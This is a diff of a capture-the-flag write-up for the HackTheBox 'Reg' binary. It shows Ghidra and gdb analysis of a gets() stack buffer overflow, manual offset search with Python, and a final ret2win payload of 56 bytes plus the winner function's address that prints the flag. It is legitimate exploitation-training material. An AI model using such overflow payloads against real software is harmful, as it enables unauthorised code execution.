@@ -24,7 +24,7 @@ RELRO     : Partial
 gdb-peda$
 ```
 
-Get information with ghidra, found main who calls run function:
+Get information with ghidra, found main function wich calls run function:
 
 ```code
 undefined8 main(void)
@@ -35,7 +35,7 @@ undefined8 main(void)
 }
 ```
 
-run function has locat_38 48 char var and gets function, so lets bufferoverflow it
+run function has locat_38 48 char var and gets, gets function is bufferoverflow exposed.
 
 ```code
 void run(void)
@@ -50,7 +50,7 @@ void run(void)
   return;
 }
 ```
-this function is not called in the code, so we would never get to it. The plan is to use the gets buffer overflow to then point to the memory address of the winner function.
+this function is not called on the code, so we never get it. The plan is use the gets buffer overflow, and pass return address from winner function after the offset. 
 
 ```code
 void winner(void)
@@ -69,39 +69,10 @@ void winner(void)
 
 ```
 
-gdb disassemble informatino:
+Lets get adress memory from winner function, exactly 0x0000000000401207 where rbp is moved to rps:
+
 
 ```code
-gdb-peda$ disassemble main
-Dump of assembler code for function main:
-   0x00000000004012ad <+0>:	push   rbp
-   0x00000000004012ae <+1>:	mov    rbp,rsp
-   0x00000000004012b1 <+4>:	mov    eax,0x0
-   0x00000000004012b6 <+9>:	call   0x40126a <run>
-   0x00000000004012bb <+14>:	mov    eax,0x0
-   0x00000000004012c0 <+19>:	pop    rbp
-   0x00000000004012c1 <+20>:	ret
-End of assembler dump.
-gdb-peda$ disassemble run
-Dump of assembler code for function run:
-   0x000000000040126a <+0>:	push   rbp
-   0x000000000040126b <+1>:	mov    rbp,rsp
-   0x000000000040126e <+4>:	sub    rsp,0x30
-   0x0000000000401272 <+8>:	mov    eax,0x0
-   0x0000000000401277 <+13>:	call   0x401196 <initialize>
-   0x000000000040127c <+18>:	lea    rdi,[rip+0xd9d]        # 0x402020
-   0x0000000000401283 <+25>:	mov    eax,0x0
-   0x0000000000401288 <+30>:	call   0x401050 <printf@plt>
-   0x000000000040128d <+35>:	lea    rax,[rbp-0x30]
-   0x0000000000401291 <+39>:	mov    rdi,rax
-   0x0000000000401294 <+42>:	mov    eax,0x0
-   0x0000000000401299 <+47>:	call   0x401080 <gets@plt>
-   0x000000000040129e <+52>:	lea    rdi,[rip+0xd8e]        # 0x402033
-   0x00000000004012a5 <+59>:	call   0x401030 <puts@plt>
-   0x00000000004012aa <+64>:	nop
-   0x00000000004012ab <+65>:	leave
-=> 0x00000000004012ac <+66>:	ret
-End of assembler dump.
 gdb-peda$ disassemble winner
 Dump of assembler code for function winner:
    0x0000000000401206 <+0>:	push   rbp
@@ -128,78 +99,48 @@ Dump of assembler code for function winner:
    0x0000000000401268 <+98>:	leave
    0x0000000000401269 <+99>:	ret
 End of assembler dump.
-gdb-peda$
+```
 
-╰─ gdb ./reg                                                                          ─╯
-GNU gdb (GDB) 12.1
-Copyright (C) 2022 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.
-Type "show copying" and "show warranty" for details.
-This GDB was configured as "x86_64-pc-linux-gnu".
-Type "show configuration" for configuration details.
-For bug reporting instructions, please see:
-<https://www.gnu.org/software/gdb/bugs/>.
-Find the GDB manual and other documentation resources online at:
-    <http://www.gnu.org/software/gdb/documentation/>.
+In this case we want to let it easy in order to get the basic concepts.
 
-For help, type "help".
-Type "apropos word" to search for commands related to "word"...
-Reading symbols from ./reg...
-(No debugging symbols found in ./reg)
-gdb-peda$ pattern create 70
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3'
-gdb-peda$ run
+gets function is put it onside char local_38 [48]; try overflow with python string until we get offset:
 
-Starting program: /home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/usr/lib/libthread_db.so.1".
-Enter your name : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3
-[----------------------------------registers-----------------------------------]
-RAX: 0xc ('\x0c')
-RBX: 0x7fffffffe078 --> 0x7fffffffe368 ("/home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg")
-RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
-RDX: 0x1
-RSI: 0x1
-RDI: 0x7ffff7f85950 --> 0x0
-RBP: 0x4147414131414162 ('bAA1AAGA')
-RSP: 0x7fffffffdf58 ("AcAA2AAHAAdAA3")
-RIP: 0x4012ac (<run+66>:	ret)
-R8 : 0x0
-R9 : 0x0
-R10: 0x3
-R11: 0x202
-R12: 0x0
-R13: 0x7fffffffe088 --> 0x7fffffffe3a3 ("SHELL=/bin/bash")
-R14: 0x0
-R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
-EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x4012a5 <run+59>:	call   0x401030 <puts@plt>
-   0x4012aa <run+64>:	nop
-   0x4012ab <run+65>:	leave
-=> 0x4012ac <run+66>:	ret
-   0x4012ad <main>:	push   rbp
-   0x4012ae <main+1>:	mov    rbp,rsp
-   0x4012b1 <main+4>:	mov    eax,0x0
-   0x4012b6 <main+9>:	call   0x40126a <run>
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffdf58 ("AcAA2AAHAAdAA3")
-0008| 0x7fffffffdf60 --> 0x334141644141 ('AAdAA3')
-0016| 0x7fffffffdf68 --> 0x7ffff7dce290 (mov    edi,eax)
-0024| 0x7fffffffdf70 --> 0x7fffffffe060 --> 0x7fffffffe068 --> 0x38 ('8')
-0032| 0x7fffffffdf78 --> 0x4012ad (<main>:	push   rbp)
-0040| 0x7fffffffdf80 --> 0x100400040
-0048| 0x7fffffffdf88 --> 0x7fffffffe078 --> 0x7fffffffe368 ("/home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg")
-0056| 0x7fffffffdf90 --> 0x7fffffffe078 --> 0x7fffffffe368 ("/home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg")
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x00000000004012ac in run ()
-gdb-peda$
+Create flag file:
+```shell
+echo "GETSSSSSSS" > flag.txt 
+```
 
+Search manual offset with python:
+```shell
+ …  hackthebox  Reg  Files  python -c 'print("A"*60)' |./reg     SIGINT   main
+Enter your name : Registered!
+Segmentation fault (core dumped)
+ …  hackthebox  Reg  Files  python -c 'print("A"*50)' |./reg   SIGSEGV   main 
+Enter your name : Registered!
+ …  hackthebox  Reg  Files  python -c 'print("A"*55)' |./reg              main 
+Enter your name : Registered!
+ …  hackthebox  Reg  Files  python -c 'print("A"*59)' |./reg              main 
+Enter your name : Registered!
+Segmentation fault (core dumped)
+ …  hackthebox  Reg  Files  python -c 'print("A"*56)' |./reg   SIGSEGV   main 
+Enter your name : Registered!
+Illegal instruction (core dumped)
+ …  hackthebox  Reg  Files  python -c 'print("A"*55)' |./reg 0  SIGILL   main 
+Enter your name : Registered!
+ …  hackthebox  Reg  Files  python -c 'print("A"*56)' |./reg              main 
+Enter your name : Registered!
+Illegal instruction (core dumped)
+ …  hackthebox  Reg  Files             
 
 ```
 
-AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGA
+Look at this, on 55 A string generated with python, no segment fault happen but It just happend on 56, so offset is 56.
+
+We have offset (56) and address we want as return 0x0000000000401207 = \x07\x12\x40\x00, lets concatenate this two values with python and pipe to reg file:
+
+```shell
+python -c 'print("A"*56 + "\x07\x12\x40\x00")'|./reg Enter your name : Registered!Congratulations!
+GETSSSSSSS
+```
+
+GREAT!
